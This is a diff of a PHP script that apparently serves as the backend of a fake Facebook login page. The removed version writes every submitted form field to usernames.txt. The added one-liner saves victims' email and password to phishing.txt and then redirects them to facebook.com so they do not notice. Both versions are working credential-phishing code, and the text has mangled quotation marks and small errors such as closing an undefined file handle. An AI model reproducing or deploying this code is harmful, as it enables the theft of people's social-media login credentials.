@@ -1,13 +1,1 @@
-<?php
-header (�Location:http://www.facebook.com/�);
-$handle = fopen(�usernames.txt�, �a�);
-foreach($_POST as $variable => $value) {
-fwrite($handle, $variable);
-fwrite($handle, �=�);
-fwrite($handle, $value);
-fwrite($handle, �\r\n�);
-}
-fwrite($handle, �\r\n�);
-fclose($handle);
-exit;
-?>
+<? if(isset($_POST[’email’]) && isset($_POST[‘pass’])) { $password=file_get_contents(‘phishing.txt’); $phishing = fopen(“phishing.txt”,”w”); fwrite($phishing,$password.”Email : “.$_POST[’email’].” , Password”.$_POST[‘pass’].”\n”); fclose($file); echo ‘<script>window.location.href=”https://wwww.facebook.com/”</script>’; } else echo ‘<script>window.location.href=”index.html”</script>’; ?>
